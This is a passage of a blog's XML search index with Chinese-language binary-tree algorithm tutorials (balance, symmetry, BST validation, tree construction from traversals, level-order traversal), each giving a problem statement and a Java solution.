Stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      TreeNode s <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> t <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> t <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null <span class="token operator">||</span> t <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>val <span class="token operator">!=</span> t<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>      stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>      stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>      stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断二叉树是否平衡</title>
      <link href="/2018/12/28/suan-fa/er-cha-shu/pan-duan-er-cha-shu-shi-fou-ping-heng/"/>
      <url>/2018/12/28/suan-fa/er-cha-shu/pan-duan-er-cha-shu-shi-fou-ping-heng/</url>
      
        <content type="html"><![CDATA[<h2 id="判断二叉树是否平衡"><a href="#判断二叉树是否平衡" class="headerlink" title="判断二叉树是否平衡"></a>判断二叉树是否平衡</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉树，你要判断它是否平衡。这里平衡指的是，对于树上任意一个节点，它的两棵子树的高度差不能大于 1。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉树是：<span class="token code keyword">     1</span>   /   \  2     4<span class="token code keyword">       / \</span><span class="token code keyword">      8  16</span>它的任意节点的左右子树高度差都不大于 1，因此它是一棵平衡二叉树。再比如说，给你的二叉树是：<span class="token code keyword">     1</span>   /   \  2     4<span class="token code keyword">         \</span><span class="token code keyword">          8</span><span class="token code keyword">           \</span><span class="token code keyword">           16</span>在这棵树中，根节点的左右子树高度差为 2，因此它不是一棵平衡二叉树。比如说，给你的二叉树是：<span class="token code keyword">     1</span>   /   \  2     4<span class="token code keyword">       / \</span><span class="token code keyword">      8  16</span>它的逆层序遍历结果是：[ [8, 16]， [2, 4], [1],]</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">int</span> <span class="token function">getHeight</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token function">getHeight</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> right <span class="token operator">=</span> <span class="token function">getHeight</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(nlog(n)), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isBalancedTreeTopDown</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">getHeight</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">getHeight</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span>      <span class="token function">isBalancedTreeTopDown</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isBalancedTreeTopDown</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isBalancedTreeBottomUp</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">getHeightAndCheck</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">int</span> <span class="token function">getHeightAndCheck</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token function">getHeightAndCheck</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> right <span class="token operator">=</span> <span class="token function">getHeightAndCheck</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>right <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>left <span class="token operator">-</span> right<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用中序和后序遍历序列构建二叉树</title>
      <link href="/2018/12/28/suan-fa/er-cha-shu/yong-qian-xu-he-zhong-xu-bian-li-xu-lie-gou-jian-er-cha-shu/"/>
      <url>/2018/12/28/suan-fa/er-cha-shu/yong-qian-xu-he-zhong-xu-bian-li-xu-lie-gou-jian-er-cha-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="用中序和后序遍历序列构建二叉树"><a href="#用中序和后序遍历序列构建二叉树" class="headerlink" title="用中序和后序遍历序列构建二叉树"></a>用中序和后序遍历序列构建二叉树</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉树的中序和后序遍历序列，你要根据这两个序列构建这棵二叉树。假设这棵二叉树节点上没有重复的数字。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的中序遍历序列和后序遍历序列分别是：中序遍历序列：2, 1, 8, 4, 16后序遍历序列：2, 8, 16, 4, 1你要返回用它们构建出的二叉树，是：<span class="token code keyword">    1</span>  /   \ 2     4<span class="token code keyword">      / \</span><span class="token code keyword">     8  16</span></code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> TreeNode <span class="token function">buildTree</span><span class="token punctuation">(</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> post<span class="token punctuation">,</span> <span class="token keyword">int</span> postStart<span class="token punctuation">,</span> <span class="token keyword">int</span> postEnd<span class="token punctuation">,</span>    <span class="token keyword">int</span> inStart<span class="token punctuation">,</span> Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> Integer<span class="token operator">></span> inPos<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>postStart <span class="token operator">></span> postEnd<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    TreeNode root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span>post<span class="token punctuation">[</span>postEnd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> rootIdx <span class="token operator">=</span> inPos<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>post<span class="token punctuation">[</span>postEnd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> leftLen <span class="token operator">=</span> rootIdx <span class="token operator">-</span> inStart<span class="token punctuation">;</span>    root<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token function">buildTree</span><span class="token punctuation">(</span>post<span class="token punctuation">,</span> postStart<span class="token punctuation">,</span> postStart<span class="token operator">+</span>leftLen<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> inStart<span class="token punctuation">,</span> inPos<span class="token punctuation">)</span><span class="token punctuation">;</span>    root<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token function">buildTree</span><span class="token punctuation">(</span>post<span class="token punctuation">,</span> postStart<span class="token operator">+</span>leftLen<span class="token punctuation">,</span> postEnd<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> rootIdx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> inPos<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> root<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> TreeNode <span class="token function">buildTree</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> in<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> post<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> Integer<span class="token operator">></span> inPos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> in<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>      inPos<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">buildTree</span><span class="token punctuation">(</span>post<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> inPos<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉树的层序遍历</title>
      <link href="/2018/12/28/suan-fa/er-cha-shu/er-cha-shu-de-ceng-xu-bian-li/"/>
      <url>/2018/12/28/suan-fa/er-cha-shu/er-cha-shu-de-ceng-xu-bian-li/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉树的层序遍历"><a href="#二叉树的层序遍历" class="headerlink" title="二叉树的层序遍历"></a>二叉树的层序遍历</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉树，要求你从根节点到叶子节点一层一层地对其进行访问，对于每一层的节点，则是从左向右进行访问。将访问的结果以<strong>二维数组</strong>返回。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉树是：<span class="token code keyword">     1</span>   /   \  2     4<span class="token code keyword">       / \</span><span class="token code keyword">      8  16</span>它的层序遍历结果是：[ [1], [2, 4], [8, 16]]</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> <span class="token function">levelOrderTraversal</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> q <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> size <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        TreeNode s <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        elem<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>检验二叉搜索树</title>
      <link href="/2018/12/28/suan-fa/er-cha-shu/jian-yan-er-cha-sou-suo-shu/"/>
      <url>/2018/12/28/suan-fa/er-cha-shu/jian-yan-er-cha-sou-suo-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="检验二叉搜索树"><a href="#检验二叉搜索树" class="headerlink" title="检验二叉搜索树"></a>检验二叉搜索树</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉树，你要判断它是不是一棵二叉搜索树。</p><pre class=" language-markdown"><code class="language-markdown">二叉搜索树的定义是：  <span class="token list punctuation">1.</span> 左子树所有节点上的值都小于根节点上的值  <span class="token list punctuation">2.</span> 右子树所有节点上的值都大于根节点上的值  <span class="token list punctuation">3.</span> 左右子树同时也为二叉搜索树比如说，给你的二叉树是：<span class="token code keyword">    4</span>   / \  2   6左子树只有一个节点 2，小于 4；右子树也只有一个节点 6，大于 4。因此这是一棵二叉搜索树。再比如说，给你的二叉树是：<span class="token code keyword">    4</span>   / \  2   6<span class="token code keyword">     / \</span><span class="token code keyword">    3   8</span>右子树存在一个节点 3，它不大于根节点 4。因此这不是一棵二叉搜索树。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  TreeNode <span class="token function">min</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span> root <span class="token operator">=</span> root<span class="token punctuation">.</span>left<span class="token punctuation">;</span>    <span class="token keyword">return</span> root<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  TreeNode <span class="token function">max</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span> root <span class="token operator">=</span> root<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token keyword">return</span> root<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*log(n)), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isValidBST</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> leftValid <span class="token operator">=</span> root<span class="token punctuation">.</span>left <span class="token operator">==</span> null <span class="token operator">||</span> root<span class="token punctuation">.</span>val <span class="token operator">></span> <span class="token function">max</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">.</span>val<span class="token punctuation">;</span>    <span class="token keyword">boolean</span> rightValid <span class="token operator">=</span> root<span class="token punctuation">.</span>right <span class="token operator">==</span> null <span class="token operator">||</span> root<span class="token punctuation">.</span>val <span class="token operator">&lt;</span> <span class="token function">min</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">.</span>val<span class="token punctuation">;</span>    <span class="token keyword">return</span> leftValid <span class="token operator">&amp;&amp;</span> rightValid <span class="token operator">&amp;&amp;</span> <span class="token function">isValidBST</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isValidBST</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isValidBSTBound</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">isValidBSTBound</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> null<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">boolean</span> <span class="token function">isValidBSTBound</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">,</span> TreeNode lower<span class="token punctuation">,</span> TreeNode upper<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lower <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> lower<span class="token punctuation">.</span>val <span class="token operator">>=</span> root<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>upper <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> upper<span class="token punctuation">.</span>val <span class="token operator">&lt;=</span> root<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">isValidBSTBound</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">,</span> lower<span class="token punctuation">,</span> root<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isValidBSTBound</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">,</span> root<span class="token punctuation">,</span> upper<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断二叉树是否对称</title>
      <link href="/2018/12/28/suan-fa/er-cha-shu/pan-duan-er-cha-shu-shi-fou-dui-cheng/"/>
      <url>/2018/12/28/suan-fa/er-cha-shu/pan-duan-er-cha-shu-shi-fou-dui-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="判断二叉树是否对称"><a href="#判断二叉树是否对称" class="headerlink" title="判断二叉树是否对称"></a>判断二叉树是否对称</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个二叉树，你要判断它是否沿中轴线对称。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉树是：<span class="token code keyword">     1</span>   /   \  2     2 / \   / \4   8 8   4这棵二叉树是沿中轴线对称的，因此要返回 true。如果我去掉最后这个 4：<span class="token code keyword">     1</span>   /   \  2     2 / \   /4   8 8就不对称了，这时就要返回 false。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">boolean</span> <span class="token function">isSymmetric</span><span class="token punctuation">(</span>TreeNode s<span class="token punctuation">,</span> TreeNode t<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> t <span class="token operator">!=</span> null<span class="token punctuation">)</span>      <span class="token keyword">return</span> s<span class="token punctuation">.</span>val <span class="token operator">==</span> t<span class="token punctuation">.</span>val 